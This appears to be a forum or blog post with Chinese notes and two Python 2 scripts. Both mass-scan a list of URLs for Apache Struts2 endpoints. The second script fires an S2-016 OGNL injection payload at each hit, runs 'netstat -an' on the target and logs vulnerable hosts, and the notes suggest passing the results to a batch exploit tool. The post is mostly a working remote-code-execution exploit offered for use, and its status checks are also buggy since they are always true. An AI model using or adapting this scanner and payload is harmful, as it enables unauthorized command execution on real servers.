#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
a = open("ip.txt","r")
b = ("/index.action","/index.do","/login.do","/login.action")
x = open("success.txt","w")
for c in a:
	d = c.strip()
	for e in b:
		g = requests.get(str(d) + str(e))
		print g.url
		if g.status_code == 200:
			print>>x,g.url	
a.close()
x.close()


备注：
ip.txt放要扫描的url，一行一个
b那里可以自定义要扫描的str2后缀
会把返回200的写到success文档里

然后可以再利用str2批量EXP工具，把成功的url导入进去


如果不想导入，再放上一个直接测试的，当然，可能会有误报，因为只放了一个016的poc进去：
#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
a = open("ip.txt","r")
b = ("/index.action","/index.do","/login.do","/login.action","/messageAction!toSubSug.action")
payload = "?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
x = open("success.txt","w")
for c in a:
	d = c.strip()
	for e in b:
		g = requests.get(str(d) + str(e),timeout=15)
		print g.url
		if g.status_code == 200 or 500:
			z = requests.get(str(g.url) + str(payload),timeout=15)
			if z.status_code == 200 or 500 and z.content.find('TCP')!=-1:
				print z
				print>>x,g.url
a.close()
x.close()
